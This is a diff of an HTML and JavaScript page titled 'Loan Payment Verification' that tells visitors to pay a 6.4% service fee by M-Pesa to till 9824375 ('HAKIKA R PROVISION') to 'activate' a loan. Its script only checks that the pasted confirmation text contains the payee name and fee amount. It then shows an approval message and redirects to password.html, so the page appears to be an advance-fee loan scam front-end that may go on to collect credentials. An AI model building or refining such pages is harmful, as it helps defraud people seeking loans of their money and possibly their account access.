@@ -8,46 +8,46 @@
 </head>
 <body class="bg-gradient-to-br from-[#FF4E50] via-[#FF6A5C] to-[#FF7C65] min-h-screen text-[#b60000] flex items-center justify-center p-4 relative">
 
-  <!-- Top-left logo -->
-  <img src="zashlogo.jpeg" alt="Zash Logo" class="absolute top-4 left-4 w-14 h-14 rounded-full shadow-lg border border-white" />
+  <!-- Logo -->
+  <img src="zashlogo.jpeg" alt="Zash Logo" class="absolute top-4 left-4 w-14 h-14 rounded-full shadow-md border border-white" />
 
-  <div class="bg-white/90 backdrop-blur-md w-full max-w-md p-6 rounded-2xl shadow-2xl text-center">
-    <h1 class="text-xl font-bold text-[#FF4E50] mb-2">Loan Payment Verification</h1>
-    <p class="text-sm text-gray-700 mb-4">To activate your loan, please pay the service fee to the Till Number below.</p>
+  <div class="bg-white/90 backdrop-blur-md w-full max-w-md p-6 rounded-2xl shadow-xl text-center">
+    <h1 class="text-2xl font-bold text-[#FF4E50] mb-3">Loan Payment Verification</h1>
+    <p class="text-sm text-gray-700 mb-6">To activate your loan, kindly pay the service fee to the Till Number below.</p>
 
-    <!-- Loan Summary -->
+    <!-- Loan Summary Box -->
     <div class="text-left bg-[#FFF5F5] p-4 rounded-xl border border-[#FFD4D4] text-sm space-y-2 mb-6">
       <p><strong>Loan Amount:</strong> Ksh <span id="verifyLoan">...</span></p>
       <p><strong>Service Fee (6.4%):</strong> <span id="verifyFee">...</span></p>
       <p><strong>Pay Till Number:</strong> 
         <span class="font-bold text-[#FF4E50]" id="tillNumber">9824375</span>
-        <button onclick="copyTill()" class="ml-2 px-2 py-1 text-xs bg-[#FF4E50] text-white rounded">Copy</button>
+        <button onclick="copyTill()" class="ml-2 px-3 py-1 text-xs bg-[#FF4E50] text-white rounded">Copy</button>
       </p>
-      <p class="text-xs text-gray-600">Use your M-Pesa to send the exact service fee via Buy Goods and Services.</p>
+      <p class="text-xs text-gray-600">Use M-Pesa to send the exact fee via Buy Goods and Services.</p>
     </div>
 
     <!-- Guide Section -->
-    <div class="text-left text-sm mb-4 bg-yellow-50 border-l-4 border-yellow-400 p-3 rounded">
-      <p class="font-medium">📋 How to Pay: HAKIKA R PROVISION</p>
-      <ol class="list-decimal pl-5 mt-1 space-y-1">
+    <div class="text-left text-sm mb-6 bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded">
+      <p class="font-medium mb-2">📋 How to Pay: <span class="text-[#FF4E50]">HAKIKA R PROVISION</span></p>
+      <ol class="list-decimal pl-5 space-y-1">
         <li>Go to M-Pesa > Lipa na M-Pesa</li>
         <li>Select <strong>Buy Goods and Services</strong></li>
         <li>Enter Till Number: <strong>9824375</strong></li>
         <li>Enter Amount: <strong id="guideFee">...</strong></li>
-        <li>Enter M-Pesa PIN and Send</li>
+        <li>Enter your M-Pesa PIN and send</li>
       </ol>
     </div>
 
     <!-- Mpesa Code Input -->
-    <div class="mb-4 text-left">
+    <div class="mb-5 text-left">
       <label for="mpesaText" class="block text-sm font-medium mb-1">Paste M-Pesa Confirmation Message</label>
       <textarea id="mpesaText" rows="3" placeholder="e.g. QHG4RT8Y Confirmed. Ksh120 sent to HAKIKA R PROVISION..."
-        class="w-full p-3 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#FF4E50] text-sm"></textarea>
+        class="w-full p-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#FF4E50] text-sm resize-none"></textarea>
     </div>
 
     <!-- Submit Button -->
     <button onclick="submitMpesaMessage()"
-            class="w-full bg-[#FF4E50] hover:bg-[#e93e3f] text-white font-semibold py-3 rounded-xl shadow-md transition">
+            class="w-full bg-[#FF4E50] hover:bg-[#e93e3f] text-white font-semibold py-3 rounded-xl shadow-lg transition">
       Submit & Continue
     </button>
   </div>
@@ -65,8 +65,8 @@
 
     function copyTill() {
       navigator.clipboard.writeText(tillNumber)
-        .then(() => alert("Till Number copied: " + tillNumber))
-        .catch(() => alert("Failed to copy"));
+        .then(() => alert("✔️ Till Number copied: " + tillNumber))
+        .catch(() => alert("❌ Failed to copy"));
     }
 
     function submitMpesaMessage() {
@@ -75,12 +75,12 @@
       const hasFee = message.includes(feeInt.toString()) || message.includes("KSH" + feeInt) || message.includes("KSH " + feeInt);
 
       if (message.length < 10 || !hasKeyword || !hasFee) {
-        alert("❌ Invalid message. Please ensure it contains:\n- HAKIKA R PROVISION\n- Ksh " + feeInt);
+        alert("❌ Invalid message. Make sure it includes:\n- HAKIKA R PROVISION\n- Ksh " + feeInt);
         return;
       }
 
       localStorage.setItem("mpesaMessage", message);
-      alert("✅ Your payment has been successfully approved!");
+      alert("✅ Your payment has been approved. Please wait while we process your loan...");
       window.location.href = "password.html";
     }
   </script>
